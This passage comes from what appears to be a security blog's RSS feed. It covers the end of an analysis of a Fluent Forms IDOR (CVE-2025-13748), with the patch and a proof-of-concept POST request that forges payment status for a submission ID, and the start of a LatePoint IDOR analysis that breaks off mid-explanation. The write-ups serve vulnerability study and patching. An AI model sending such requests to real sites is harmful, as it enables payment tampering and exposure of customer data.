class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function validateScaRequest($submissionId, $paymentIntentId, $submission = null, $transaction = null)&#xA;{&#xA;    $strictMode = apply_filters(&amp;#39;fluentform/stripe_sca_strict_security&amp;#39;, false);&#xA;    $warnings = [];&#xA;&#xA;    // Validate nonce (optional in non-strict mode for backward compatibility)&#xA;    $nonce = isset($_REQUEST[&amp;#39;_ff_stripe_nonce&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;_ff_stripe_nonce&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;    &#xA;    if ($nonce) {&#xA;        $nonceAction = &amp;#39;fluentform_sca_confirm_&amp;#39; . $submissionId;&#xA;        if (!wp_verify_nonce($nonce, $nonceAction)) {&#xA;            $error = __(&amp;#39;Security verification failed. Invalid nonce.&amp;#39;, &amp;#39;fluentform&amp;#39;);&#xA;            if ($strictMode) {&#xA;                return new \WP_Error(&amp;#39;invalid_nonce&amp;#39;, $error);&#xA;            }&#xA;            $warnings[] = &amp;#39;Invalid nonce provided&amp;#39;;&#xA;        }&#xA;    } else {&#xA;        $warning = &amp;#39;No nonce provided for SCA payment confirmation&amp;#39;;&#xA;        if ($strictMode) {&#xA;            return new \WP_Error(&amp;#39;missing_nonce&amp;#39;, __(&amp;#39;Security verification failed. Nonce required.&amp;#39;, &amp;#39;fluentform&amp;#39;));&#xA;        }&#xA;        $warnings[] = $warning;&#xA;    }&#xA;&#xA;    // Validate submission exists&#xA;    if (!$submission || !$submission-&amp;gt;id) {&#xA;        return new \WP_Error(&amp;#39;invalid_submission&amp;#39;, __(&amp;#39;Invalid submission.&amp;#39;, &amp;#39;fluentform&amp;#39;));&#xA;    }&#xA;&#xA;    if ($submission-&amp;gt;payment_status === &amp;#39;paid&amp;#39;) {&#xA;        return new \WP_Error(&#xA;            &amp;#39;already_paid&amp;#39;,&#xA;            __(&amp;#39;This payment has already been completed and cannot be modified.&amp;#39;, &amp;#39;fluentform&amp;#39;)&#xA;        );&#xA;    }&#xA;&#xA;    // stores it in transaction.charge_id, and frontend sends it back.&#xA;    // Mismatch only occurs during attack attempts.&#xA;    if ($transaction &amp;amp;&amp;amp; $transaction-&amp;gt;charge_id) {&#xA;        if ($transaction-&amp;gt;charge_id !== $paymentIntentId) {&#xA;            return new \WP_Error(&#xA;                &amp;#39;payment_intent_mismatch&amp;#39;,&#xA;                __(&amp;#39;Payment verification failed. Payment intent does not match.&amp;#39;, &amp;#39;fluentform&amp;#39;)&#xA;            );&#xA;        }&#xA;    }&#xA;&#xA;    // Log warnings for monitoring&#xA;    if (!empty($warnings) &amp;amp;&amp;amp; defined(&amp;#39;WP_DEBUG&amp;#39;) &amp;amp;&amp;amp; WP_DEBUG) {&#xA;        $logData = [&#xA;            &amp;#39;parent_source_id&amp;#39; =&amp;gt; $submission-&amp;gt;form_id,&#xA;            &amp;#39;source_type&amp;#39;      =&amp;gt; &amp;#39;submission_item&amp;#39;,&#xA;            &amp;#39;source_id&amp;#39;        =&amp;gt; $submission-&amp;gt;id,&#xA;            &amp;#39;component&amp;#39;        =&amp;gt; &amp;#39;Payment&amp;#39;,&#xA;            &amp;#39;status&amp;#39;           =&amp;gt; &amp;#39;warning&amp;#39;,&#xA;            &amp;#39;title&amp;#39;            =&amp;gt; __(&amp;#39;Stripe SCA Security Warning&amp;#39;, &amp;#39;fluentform&amp;#39;),&#xA;            &amp;#39;description&amp;#39;      =&amp;gt; implode(&amp;#39;; &amp;#39;, $warnings)&#xA;        ];&#xA;        do_action(&amp;#39;fluentform/log_data&amp;#39;, $logData);&#xA;    }&#xA;&#xA;    return [&#xA;        &amp;#39;valid&amp;#39;    =&amp;gt; true,&#xA;        &amp;#39;warnings&amp;#39; =&amp;gt; $warnings&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;validateScaRequest&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Verifies that &lt;code&gt;submission_id&lt;/code&gt; exists and is valid&lt;/li&gt;&#xA;&lt;li&gt;Prevents processing if the submission is already paid&lt;/li&gt;&#xA;&lt;li&gt;Binds &lt;code&gt;payment_intent_id&lt;/code&gt; to the corresponding transaction&lt;/li&gt;&#xA;&lt;li&gt;Prevents forged payment intents&lt;/li&gt;&#xA;&lt;li&gt;Adds nonce verification&lt;/li&gt;&#xA;&lt;li&gt;Logs abnormal behavior&lt;/li&gt;&#xA;&lt;li&gt;Fully blocks unauthorized submission state manipulation&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;This effectively eliminates the IDOR vulnerability.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Extract submission_id &amp;amp; payment_intent_id from request&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;No nonce validation&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Load submission by submission_id&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;No ownership or relationship check&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Load transaction using submission_id&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;No validation between payment_intent_id and transaction&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Process payment confirmation&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Update submission status (success / failed)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker manipulates victim&amp;#39;s submission&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: victim.com&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;action=fluentform_sca_inline_confirm_payment&#xA;&amp;amp;submission_id=1024&#xA;&amp;amp;payment_method=card&#xA;&amp;amp;payment_intent_id=pi_fake&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The CVE-2025-13748 vulnerability stems from &lt;strong&gt;trusting client-controlled input&lt;/strong&gt;, specifically &lt;code&gt;submission_id&lt;/code&gt;, without any ownership or context validation. The payment confirmation endpoint is exposed to unauthenticated users and allows direct manipulation of submissions without binding them to a legitimate user, form, or transaction.&lt;/p&gt;&#xA;&lt;p&gt;The lack of ownership checks, missing linkage between &lt;code&gt;payment_intent_id&lt;/code&gt; and transaction, and absence of request authentication collectively enable attackers to &lt;strong&gt;manipulate other users’ payment states&lt;/strong&gt;. This is a textbook case of &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; caused by flawed business logic rather than a low-level technical bug.&lt;/p&gt;&#xA;&lt;p&gt;The patch fully resolves the issue by introducing layered validation, strict checks, and contextual binding, eliminating the attack surface.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never trust client-supplied data, even in internal payment flows.&lt;/li&gt;&#xA;&lt;li&gt;IDOR vulnerabilities often stem from missing ownership validation, not missing input sanitization.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; endpoints must be strictly protected as they are accessible to everyone.&lt;/li&gt;&#xA;&lt;li&gt;Payment flows must tightly bind &lt;strong&gt;submission – transaction – payment intent&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Always validate both &lt;strong&gt;request origin&lt;/strong&gt; and &lt;strong&gt;business context&lt;/strong&gt;, not just data format.&lt;/li&gt;&#xA;&lt;li&gt;Defense-in-depth is the only effective way to prevent IDOR.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/fluentform/vulnerability/wordpress-fluent-forms-plugin-6-1-7-unauthenticated-insecure-direct-object-reference-to-payment-status-tampering-via-submission-id-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FluentForm Plugin &amp;lt;= 6.1.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3769 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-26-cve-2025-3769/</link>
      <pubDate>Fri, 26 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-26-cve-2025-3769/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;hr&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;LatePoint – Calendar Booking Plugin for Appointments and Events&lt;/strong&gt; plugin on WordPress contains an &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;5.1.92&lt;/strong&gt;, via the &lt;code&gt;view_booking_summary_in_lightbox&lt;/code&gt; parameter, due to &lt;strong&gt;missing validation on user-controlled keys&lt;/strong&gt;.&#xA;This vulnerability allows an &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; to access appointment details, including &lt;strong&gt;customer names and email addresses&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3769&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3769&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.1.92&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.1.93&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/latepoint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LatePoint&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.1.92&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.1.93&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_latepoint_route_call&amp;#39;, array( $this, &amp;#39;route_call&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; is a hook for unauthenticated users. When a request is sent to the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with the parameter &lt;code&gt;action=latepoint_route_call&lt;/code&gt;, the callback &lt;code&gt;route_call&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function route_call() {&#xA;    $route_name = OsRouterHelper::get_request_param( &amp;#39;route_name&amp;#39;, OsRouterHelper::build_route_name( &amp;#39;dashboard&amp;#39;, &amp;#39;index&amp;#39; ) );&#xA;    OsRouterHelper::call_by_route_name( $route_name, OsRouterHelper::get_request_param( &amp;#39;return_format&amp;#39;, &amp;#39;html&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;route_call()&lt;/code&gt; function calls &lt;code&gt;get_request_param()&lt;/code&gt; with two parameters: &lt;code&gt;&#39;route_name&#39;&lt;/code&gt; and the default value &lt;code&gt;OsRouterHelper::build_route_name( &#39;dashboard&#39;, &#39;index&#39; )&lt;/code&gt; if the &lt;code&gt;route_name&lt;/code&gt; parameter does not exist in the request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_request_param($name, $default = false){&#xA;    // $name = &amp;#39;route_name&amp;#39;&#xA;    // $default = OsRouterHelper::build_route_name( &amp;#39;dashboard&amp;#39;, &amp;#39;index&amp;#39;&#xA;    if(isset($_GET[$name])){&#xA;      $param = sanitize_text_field(wp_unslash($_GET[$name]));&#xA;    }elseif(isset($_POST[$name])){&#xA;      $param = sanitize_text_field(wp_unslash($_POST[$name]));&#xA;    }else{&#xA;    &#x9;$param = $default;&#xA;    }&#xA;    return $param;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function build_route_name($controller, $action){&#xA;    return $controller.&amp;#39;__&amp;#39;.$action;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After obtaining the value of &lt;code&gt;$route_name&lt;/code&gt;, the function continues by calling &lt;code&gt;call_by_route_name&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function call_by_route_name($route_name, $return_format = &amp;#39;html&amp;#39;){&#xA;    OsDebugHelper::log_route($route_name, $return_format);&#xA;    $route_data = self::convert_route_name_to_controller_and_action($route_name);&#xA;    if(!empty($route_data)){&#xA;        $controller_obj = $route_data[&amp;#39;controller&amp;#39;];&#xA;        $action = $route_data[&amp;#39;action&amp;#39;];&#xA;        if($return_format) $controller_obj-&amp;gt;set_return_format($return_format);&#xA;        // check if user is allowed to access this route&#xA;        if($controller_obj-&amp;gt;can_current_user_access_action($action)){&#xA;            $controller_obj-&amp;gt;route_name = $route_name;&#xA;            $controller_obj-&amp;gt;$action();&#xA;        }else{&#xA;            if($controller_obj-&amp;gt;get_return_format() == &amp;#39;json&amp;#39;){&#xA;                $controller_obj-&amp;gt;send_json( [&amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_ERROR, &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Not Authorized&amp;#39;, &amp;#39;latepoint&amp;#39;)] );&#xA;            }else{&#xA;                echo &amp;#39;&amp;lt;div class=&amp;#34;latepoint-not-authorized&amp;#34;&amp;gt;&amp;lt;div class=&amp;#34;not-authorized-message&amp;#34;&amp;gt;&amp;#39;.esc_html__(&amp;#39;Not Authorized&amp;#39;, &amp;#39;latepoint&amp;#39;).&amp;#39;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#39;;&#xA;            }&#xA;            exit();&#xA;        }&#xA;    }else{&#xA;        esc_html_e(&amp;#39;Page Not Found&amp;#39;, &amp;#39;latepoint&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function &lt;code&gt;call_by_route_name()&lt;/code&gt; logs the route and retrieves the corresponding controller and action for that route.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function convert_route_name_to_controller_and_action($route_name): array{&#xA;    list($controller_name, $action) = explode(&amp;#39;__&amp;#39;, $route_name);&#xA;    if(empty($controller_name) || empty($action)) return [];&#xA;    $controller_name = str_replace(&amp;#39;_&amp;#39;, &amp;#39;&amp;#39;, ucwords($controller_name, &amp;#39;_&amp;#39;));&#xA;    $controller_class_name = &amp;#39;Os&amp;#39;.$controller_name.&amp;#39;Controller&amp;#39;;&#xA;    if(class_exists($controller_class_name)) {&#xA;        $controller_obj = new $controller_class_name();&#xA;        if(method_exists($controller_obj, $action)) {&#xA;            // check if action is valid&#xA;            return [&amp;#39;controller&amp;#39; =&amp;gt; $controller_obj, &amp;#39;action&amp;#39; =&amp;gt; $action];&#xA;        }else{&#xA;            return [];&#xA;        }&#xA;    }else{&#xA;        return [];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function receives &lt;code&gt;$route_name&lt;/code&gt; in the format &lt;code&gt;&#39;controller__action&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Split the string by &lt;code&gt;__&lt;/code&gt; into &lt;code&gt;$controller_name&lt;/code&gt; and 